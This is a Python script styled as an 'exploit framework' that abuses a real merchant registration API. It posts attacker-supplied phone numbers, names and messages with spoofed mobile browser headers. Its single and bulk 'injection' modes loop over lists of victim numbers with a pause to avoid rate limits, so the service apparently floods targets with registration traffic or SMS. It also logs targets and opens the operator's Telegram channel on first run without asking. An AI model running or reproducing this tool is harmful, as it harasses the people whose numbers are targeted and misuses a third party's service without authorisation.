#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
====================================================================
  R D X   I N T E L   //   E X P L O I T   F R A M E W O R K
====================================================================
  Operator : RDX HUNTER
  Channel  : https://t.me/rdx_tools
"""

import os
import sys
import json
import time
import random
import shutil
import urllib.request
import urllib.error
import re
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import List

# ─────────────────────────────────────────────────────────────────
#  CORE CONFIGURATION
# ─────────────────────────────────────────────────────────────────
OWNER = "RDX HUNTER"
CHANNEL = "https://t.me/rdx_tools"
API_URL = "https://api-merchant.carrybee.com/api/v2/merchant/register"
LOG_FILE = Path(".rdx_framework_audit.log")

HEADERS = {
    "host": "api-merchant.carrybee.com",
    "sec-ch-ua-platform": '"Android"',
    "user-agent": "Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.8010.36 Mobile Safari/537.36",
    "accept": "application/json",
    "sec-ch-ua": '"Android WebView";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
    "content-type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "origin": "https://merchant.carrybee.com",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://merchant.carrybee.com/",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "priority": "u=1, i",
}

# ─────────────────────────────────────────────────────────────────
#  TERMINAL FORMATTING & UTILS
# ─────────────────────────────────────────────────────────────────
class UI:
    TTY = sys.stdout.isatty()
    
    RST = "\033[0m" if TTY else ""
    BLD = "\033[1m" if TTY else ""
    
    # Cyberpunk Palette
    RED = "\033[38;5;196m" if TTY else ""  # Bright Red
    DRK = "\033[38;5;88m"  if TTY else ""  # Deep Maroon
    GRY = "\033[38;5;240m" if TTY else ""  # Dark Gray
    WHT = "\033[38;5;255m" if TTY else ""  # Pure White
    CYN = "\033[38;5;51m"  if TTY else ""  # Cyan (for subtle highlights)

    @classmethod
    def get_width(cls) -> int:
        # Safe width for even the smallest mobile terminals
        return min(65, max(40, shutil.get_terminal_size((50, 20)).columns - 2))

    @classmethod
    def pad(cls, text: str, width: int) -> str:
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        visible_len = len(ansi_escape.sub('', text))
        return text + (" " * max(0, width - visible_len))

    @classmethod
    def clear(cls):
        os.system('cls' if os.name == 'nt' else 'clear')

# ─────────────────────────────────────────────────────────────────
#  DATA STRUCTURES
# ─────────────────────────────────────────────────────────────────
@dataclass
class TargetData:
    number: str
    name: str
    msg: str

@dataclass
class AttackResult:
    success: bool
    code: int
    data: TargetData

# ─────────────────────────────────────────────────────────────────
#  EXPLOIT ENGINE
# ─────────────────────────────────────────────────────────────────
class Engine:
    @staticmethod
    def execute(data: TargetData) -> AttackResult:
        payload = json.dumps({
            "phone_number": data.number.strip(),
            "name": data.name.strip(),
            "business_name": data.msg.strip()
        }, ensure_ascii=False).encode("utf-8")
        
        headers = dict(HEADERS)
        headers["content-length"] = str(len(payload))
        
        req = urllib.request.Request(API_URL, data=payload, headers=headers, method="POST")
        
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return AttackResult(True, resp.status, data)
        except urllib.error.HTTPError as e:
            return AttackResult(False, e.code, data)
        except Exception:
            return AttackResult(False, 000, data)

# ─────────────────────────────────────────────────────────────────
#  ANIMATIONS & LOADERS
# ─────────────────────────────────────────────────────────────────
def stealth_loader(duration: float = 0.8) -> None:
    if not UI.TTY:
        time.sleep(duration)
        return
    frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        sys.stdout.write(f"\r{UI.RED}{frames[i % len(frames)]}{UI.RST} {UI.GRY}Executing remote payload...{UI.RST}")
        sys.stdout.flush()
        time.sleep(0.04)
        i += 1
    sys.stdout.write(f"\r{' ' * 50}\r")

def bulk_progress_bar(current: int, total: int) -> None:
    if not UI.TTY:
        return
    width = 25
    pct = current / total
    filled = int(width * pct)
    bar = UI.RED + "█" * filled + UI.DRK + "░" * (width - filled) + UI.RST
    sys.stdout.write(f"\r{UI.GRY}[{UI.RST}{bar}{UI.GRY}] {UI.WHT}{int(pct*100)}%{UI.RST} ({current}/{total})")
    sys.stdout.flush()

# ─────────────────────────────────────────────────────────────────
#  INTERFACE RENDERING
# ─────────────────────────────────────────────────────────────────
def render_banner() -> None:
    """Dynamic, non-breaking professional banner."""
    w = UI.get_width()
    print()
    print(f"{UI.DRK}╔{'═' * w}╗{UI.RST}")
    
    title = f" {UI.BLD}{UI.RED}RDX INTEL{UI.RST} // EXPLOIT FRAMEWORK"
    print(f"{UI.DRK}║{UI.RST}{UI.pad(title, w)}{UI.DRK}║{UI.RST}")
    
    
    print(f"{UI.DRK}╠{'═' * w}╣{UI.RST}")
    
    status = f" {UI.GRY}Status:{UI.RST} {UI.CYN}CONNECTED{UI.RST}  {UI.GRY}|{UI.RST}  {UI.GRY}Latency:{UI.RST} {UI.CYN}Optimized{UI.RST}"
    print(f"{UI.DRK}║{UI.RST}{UI.pad(status, w)}{UI.DRK}║{UI.RST}")
    
    print(f"{UI.DRK}╚{'═' * w}╝{UI.RST}")
    print()

def render_result_block(data: TargetData, success: bool) -> None:
    w = UI.get_width()
    
    if success:
        print(f"  {UI.RED}{UI.BLD}» EXPLOIT SUCCESSFUL{UI.RST}")
    else:
        print(f"  {UI.DRK}{UI.BLD}» TARGET REJECTED{UI.RST}")
        
    print(f"{UI.DRK}─{UI.RST}" * (w + 1))
    
    print(f"  {UI.GRY}number :{UI.RST}  {UI.WHT}{UI.BLD}{data.number}{UI.RST}")
    print(f"  {UI.GRY}name   :{UI.RST}  {UI.WHT}{UI.BLD}{data.name}{UI.RST}")
    print(f"  {UI.GRY}msg    :{UI.RST}  {UI.WHT}{UI.BLD}{data.msg}{UI.RST}")
    
    print(f"{UI.DRK}─{UI.RST}" * (w + 1))
    
    print(f"  {UI.RED}{UI.BLD}WONER  :{UI.RST}  {UI.WHT}{UI.BLD}{OWNER}{UI.RST}")
    print(f"  {UI.RED}{UI.BLD}channel:{UI.RST}  {UI.WHT}{UI.BLD}{CHANNEL}{UI.RST}")
    print(f"{UI.DRK}─{UI.RST}" * (w + 1))
    print()

# ─────────────────────────────────────────────────────────────────
#  LOGIC & WORKFLOW
# ─────────────────────────────────────────────────────────────────
def log_audit(res: AttackResult) -> None:
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            record = {
                "time": datetime.now().isoformat(),
                "status": "SUCCESS" if res.success else "FAILED",
                "target": {"num": res.data.number, "name": res.data.name}
            }
            f.write(json.dumps(record) + "\n")
    except Exception:
        pass

def trigger_channel() -> None:
    marker = Path(".rdx_auth")
    if not marker.exists():
        import webbrowser
        try:
            webbrowser.open(CHANNEL)
            marker.touch()
        except Exception:
            pass

def run_single() -> None:
    w = UI.get_width()
    print(f"{UI.DRK}┌───[ {UI.RED}SINGLE EXPLOIT{UI.DRK} ]{'─' * (w - 18)}┐{UI.RST}")
    num  = input(f"{UI.DRK}├─▶{UI.RST} {UI.GRY}number :{UI.RST} ").strip()
    name = input(f"{UI.DRK}├─▶{UI.RST} {UI.GRY}name   :{UI.RST} ").strip()
    msg  = input(f"{UI.DRK}└─▶{UI.RST} {UI.GRY}msg    :{UI.RST} ").strip()
    
    if num and name and msg:
        print()
        stealth_loader()
        data = TargetData(num, name, msg)
        res = Engine.execute(data)
        render_result_block(data, res.success)
        log_audit(res)

def run_bulk() -> None:
    w = UI.get_width()
    print(f"{UI.DRK}┌───[ {UI.RED}BULK EXPLOIT{UI.DRK} ]{'─' * (w - 16)}┐{UI.RST}")
    print(f"{UI.GRY}Enter numbers separated by comma ( , ){UI.RST}")
    
    nums_str = input(f"{UI.DRK}├─▶{UI.RST} {UI.GRY}numbers:{UI.RST} ").strip()
    if not nums_str: return
    
    name = input(f"{UI.DRK}├─▶{UI.RST} {UI.GRY}name   :{UI.RST} ").strip()
    msg  = input(f"{UI.DRK}└─▶{UI.RST} {UI.GRY}msg    :{UI.RST} ").strip()
    
    if not (name and msg): return

    numbers = [n.strip() for n in nums_str.split(",") if n.strip()]
    total = len(numbers)
    
    print()
    for i, num in enumerate(numbers, 1):
        bulk_progress_bar(i - 1, total)
        data = TargetData(num, name, msg)
        res = Engine.execute(data)
        log_audit(res)
        time.sleep(0.5) # Prevent rate limit
        
    bulk_progress_bar(total, total)
    print("\n")
    
    print(f"{UI.RED}{UI.BLD}[+] Bulk processing complete. {total} targets sent.{UI.RST}")
    print(f"{UI.DRK}Check {LOG_FILE} for audit logs.{UI.RST}\n")

def run_menu() -> None:
    while True:
        UI.clear()
        render_banner()
        
        w = UI.get_width()
        print(f"{UI.GRY}  [ {UI.RED}1{UI.GRY} ]  Single Target Injection{UI.RST}")
        print(f"{UI.GRY}  [ {UI.RED}2{UI.GRY} ]  Bulk Injection (Comma separated){UI.RST}")
        print(f"{UI.GRY}  [ {UI.RED}3{UI.GRY} ]  Join Operator Channel{UI.RST}")
        print(f"{UI.GRY}  [ {UI.RED}0{UI.GRY} ]  Terminate Session{UI.RST}")
        print(f"{UI.DRK}─{UI.RST}" * (w + 1))
        
        choice = input(f"{UI.RED}❯{UI.RST} Select option: ").strip()
        
        if choice == "1":
            print()
            run_single()
            input(f"\n{UI.GRY}Press Enter to return to menu...{UI.RST}")
        elif choice == "2":
            print()
            run_bulk()
            input(f"\n{UI.GRY}Press Enter to return to menu...{UI.RST}")
        elif choice == "3":
            import webbrowser
            webbrowser.open(CHANNEL)
        elif choice == "0":
            print(f"\n{UI.DRK}[*] Terminating session...{UI.RST}\n")
            break

def main() -> int:
    trigger_channel()
    
    # CLI Support for scripting
    if len(sys.argv) == 4:
        data = TargetData(sys.argv[1], sys.argv[2], sys.argv[3])
        stealth_loader()
        res = Engine.execute(data)
        render_banner()
        render_result_block(data, res.success)
        log_audit(res)
        return 0
        
    # Interactive UI
    try:
        run_menu()
    except KeyboardInterrupt:
        print(f"\n{UI.DRK}[*] Connection terminated.{UI.RST}\n")
        return 130
    return 0

if __name__ == "__main__":
    sys.exit(main())
